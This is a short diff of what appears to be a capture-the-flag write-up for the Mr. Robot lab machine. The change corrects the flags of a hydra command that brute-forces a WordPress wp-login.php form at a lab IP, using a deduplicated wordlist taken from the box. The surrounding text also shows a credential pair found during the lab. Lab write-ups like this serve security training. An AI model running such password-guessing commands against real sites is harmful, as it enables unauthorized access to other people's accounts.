@@ -21,7 +21,7 @@ We find a wordpress admin site and decide to use ```burpsuite``` to intercept th
 ```Elliot ER28-0652```. We sorted the list before doing a wp-scan: ```sort fsocity.dic| uniq > fsoc.dic ```.
 commands used: 
 ```
-hydra -l fsocity.dic -P 123  10.0.0.48 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
+hydra -L fsocity.dic -p 123  10.0.0.48 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
 ```
 
 ```
